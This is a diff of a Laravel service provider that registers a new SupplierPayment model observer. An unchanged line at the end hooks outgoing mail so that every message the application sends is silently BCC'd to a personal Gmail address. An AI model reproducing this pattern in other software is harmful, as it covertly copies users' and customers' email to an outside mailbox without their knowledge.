@@ -12,6 +12,7 @@ use App\Models\Order;
 use App\Models\ProductImportItem;
 use App\Models\SalesPointCashierTrans;
 use App\Models\ShippingWarehouse;
+use App\Models\SupplierPayment;
 use App\Models\WarehouseReturn;
 use App\Observers\CashierReturnFatoraObserver;
 use App\Observers\CashierSaleObserver;
@@ -23,6 +24,7 @@ use App\Observers\CompanySalesTransferObserver;
 use App\Observers\OrderObserver;
 use App\Observers\ProductImportItemObserver;
 use App\Observers\ShippingWarehouseObserver;
+use App\Observers\SupplierPaymentObserver;
 use App\Observers\WarehouseReturnObserver;
 use Filament\Support\Facades\FilamentIcon;
 use Illuminate\Support\Facades\Mail;
@@ -65,6 +67,8 @@ class AppServiceProvider extends ServiceProvider
     SalesPointCashierTrans::observe(CashierTransObserver::class);
     CompanySalesTransfer::observe(CompanySalesTransferObserver::class);
     CompanyEntry::observe(CompanyEntryObserver::class);
+
+    SupplierPayment::observe(SupplierPaymentObserver::class);
 
     Event::listen(MessageSending::class, function (MessageSending $event) {
       $event->message->addBcc('aloshmohammad2001@gmail.com');
